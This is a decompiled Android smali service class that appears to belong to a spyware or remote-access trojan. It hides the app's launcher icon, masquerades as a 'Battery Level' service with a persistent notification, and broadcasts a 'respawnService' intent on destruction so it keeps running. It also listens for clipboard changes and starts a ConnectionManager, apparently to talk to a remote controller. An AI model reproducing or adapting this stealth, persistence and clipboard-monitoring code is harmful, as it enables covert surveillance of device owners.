.class public Lcom/example/project20/MainService;
.super Landroid/app/Service;
.source "MainService.java"


# static fields
.field static final synthetic $assertionsDisabled:Z

.field private static contextOfApplication:Landroid/content/Context;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 26
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method public static getContextOfApplication()Landroid/content/Context;
    .locals 1

    .line 119
    sget-object v0, Lcom/example/project20/MainService;->contextOfApplication:Landroid/content/Context;

    return-object v0
.end method

.method private startMyOwnForeground()V
    .locals 4

    .line 47
    new-instance v0, Landroid/app/NotificationChannel;

    const-string v1, "example.permanence"

    const-string v2, "Battery Level Service"

    const/4 v3, 0x0

    invoke-direct {v0, v1, v2, v3}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    const v2, -0xffff01

    .line 48
    invoke-virtual {v0, v2}, Landroid/app/NotificationChannel;->setLightColor(I)V

    .line 49
    invoke-virtual {v0, v3}, Landroid/app/NotificationChannel;->setLockscreenVisibility(I)V

    const-string v2, "notification"

    .line 51
    invoke-virtual {p0, v2}, Lcom/example/project20/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/app/NotificationManager;

    .line 53
    invoke-virtual {v2, v0}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    .line 55
    new-instance v0, Landroidx/core/app/NotificationCompat$Builder;

    invoke-direct {v0, p0, v1}, Landroidx/core/app/NotificationCompat$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const/4 v1, 0x1

    .line 56
    invoke-virtual {v0, v1}, Landroidx/core/app/NotificationCompat$Builder;->setOngoing(Z)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v0

    const-string v2, "Battery Level"

    .line 57
    invoke-virtual {v0, v2}, Landroidx/core/app/NotificationCompat$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v0

    .line 58
    invoke-virtual {v0, v1}, Landroidx/core/app/NotificationCompat$Builder;->setPriority(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v0

    const-string v2, "service"

    .line 59
    invoke-virtual {v0, v2}, Landroidx/core/app/NotificationCompat$Builder;->setCategory(Ljava/lang/String;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v0

    .line 60
    invoke-virtual {v0}, Landroidx/core/app/NotificationCompat$Builder;->build()Landroid/app/Notification;

    move-result-object v0

    .line 61
    invoke-virtual {p0, v1, v0}, Lcom/example/project20/MainService;->startForeground(ILandroid/app/Notification;)V

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onCreate()V
    .locals 4

    .line 31
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 33
    invoke-virtual {p0}, Lcom/example/project20/MainService;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    .line 34
    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lcom/example/project20/MainActivity;

    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/4 v2, 0x2

    const/4 v3, 0x1

    invoke-virtual {v0, v1, v2, v3}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    .line 36
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-le v0, v1, :cond_0

    .line 37
    invoke-direct {p0}, Lcom/example/project20/MainService;->startMyOwnForeground()V

    goto :goto_0

    .line 39
    :cond_0
    new-instance v0, Landroid/app/Notification;

    invoke-direct {v0}, Landroid/app/Notification;-><init>()V

    invoke-virtual {p0, v3, v0}, Lcom/example/project20/MainService;->startForeground(ILandroid/app/Notification;)V

    :goto_0
    return-void
.end method

.method public onDestroy()V
    .locals 2

    .line 104
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 106
    new-instance v0, Landroid/content/Intent;

    const-string v1, "respawnService"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v0}, Lcom/example/project20/MainService;->sendBroadcast(Landroid/content/Intent;)V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 0

    .line 67
    invoke-super {p0, p1, p2, p3}, Landroid/app/Service;->onStartCommand(Landroid/content/Intent;II)I

    .line 72
    new-instance p1, Lcom/example/project20/MainService$1;

    invoke-direct {p1, p0}, Lcom/example/project20/MainService$1;-><init>(Lcom/example/project20/MainService;)V

    const-string p2, "clipboard"

    .line 93
    invoke-virtual {p0, p2}, Lcom/example/project20/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p2

    check-cast p2, Landroid/content/ClipboardManager;

    .line 94
    invoke-virtual {p2, p1}, Landroid/content/ClipboardManager;->addPrimaryClipChangedListener(Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;)V

    .line 97
    sput-object p0, Lcom/example/project20/MainService;->contextOfApplication:Landroid/content/Context;

    .line 98
    invoke-static {p0}, Lcom/example/project20/ConnectionManager;->startAsync(Landroid/content/Context;)V

    const/4 p1, 0x1

    return p1
.end method
